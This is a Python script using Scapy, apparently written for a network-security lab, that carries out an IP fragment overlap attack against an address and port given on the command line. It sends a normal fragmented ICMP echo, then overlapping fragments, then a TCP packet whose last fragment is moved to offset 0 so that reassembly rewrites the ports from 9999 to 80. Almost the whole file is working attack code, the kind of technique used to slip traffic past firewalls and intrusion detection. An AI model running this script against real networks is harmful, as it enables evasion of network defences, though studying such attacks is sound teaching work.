"""
Authors : Fridez Lucas, Maxime Welcklen
Attack : simple Overlapping framgents attack
"""
from scapy.all import *
import argparse
import sys


#wireshark filter : ip.src==192.168.1.111




def __configure_argparse__():
    """Configure argparser

    Returns:
       parser: Arguments parser
    """
    parser = argparse.ArgumentParser(
        description='ICMP attack arguments')

    # Required params
    requiredNamed = parser.add_argument_group('Optionnal named arguments')
    requiredNamed.add_argument(
        '-ip', help='Destination IP address', required=True)
    requiredNamed.add_argument(
        '-p', type=int, help='destinatio port', required=True)

    return parser


def main(destination_port, destination_ip):
    """Main method to handle attack logic

    Args:
        destination_port (str): Destination port
        destination_ip (str): Destination IP
    """
    # Send ICMP packet correctly

    id1 = 12345
    id2 = 54321

    frag1=IP(dst=destination_ip, id=id1, proto=1, frag=0, flags=1) / ICMP(type=8, code=0, chksum=0xdce8)
    frag2=IP(dst=destination_ip, id=id1, proto=1, frag=1, flags=1) / "AAAAAAAA"
    frag3=IP(dst=destination_ip, id=id1, proto=1, frag=2, flags=1) / "BBBBBBBB"
    frag4=IP(dst=destination_ip, id=id1, proto=1, frag=3, flags=0) / "CCCCCCCC"

    send(frag1)
    send(frag2)
    send(frag3)
    send(frag4)

    # Send ICMP packet incorrectly with minor overlap

    frag1=IP(dst=destination_ip, id=id2, proto=1, frag=0, flags=1) / ICMP(type=8, code=0, chksum=0xdce8)
    frag2=IP(dst=destination_ip, id=id2, proto=1, frag=1, flags=1) / "AAAAAAAA"
    frag3=IP(dst=destination_ip, id=id2, proto=1, frag=2, flags=1) / "BBBBBBBBBBBBBBBB"
    frag4=IP(dst=destination_ip, id=id2, proto=1, frag=3, flags=0) / "CCCCCCCC"

    send(frag1)
    send(frag2)
    send(frag3)
    send(frag4)

    #Send ICMP packet replacing values

    # create two IP packets, one with 1480 payload bytes and one with 4 payload bytes
    # initial payload is TCP with sport/dport being 9999

    frags = fragment(IP(dst=destination_ip)/TCP(sport=9999,dport=destination_port)/("FAKE"*(1464//4)))

    # [<IP  flags=MF frag=0 proto=tcp dst=10.0.2.17 |<Raw  load="'\x0f'\x0f\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\xd5n\x00\x00FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE" |>>, <IP  flags= frag=185 proto=tcp dst=10.0.2.17 |<Raw  load='FAKE' |>>]
    # overwrite the 4 payload bytes of fragment 2 to overlap the reassembled IP packet at offset 0 to overwrite sport/dport to port 80,80

    frags[1][Raw].load=struct.pack("!HH",80,80)  # network byteorder
    frags[1][IP].frag=0
    # <IP  flags= frag=0 proto=tcp dst=10.0.2.17 |<Raw  load='\x00P\x00P' |>>

    # send your fragments and watch them being reassembled in wireshark/...
    # they should show up the initial IP/TCP/sport=dport=9999 packet but with sport/dport being set to 80
    send(frags)
    

# Entry point
# Run this script in sudo mode !
if __name__ == "__main__":
    parser = __configure_argparse__()
    args = parser.parse_args()
    main(args.p, args.ip)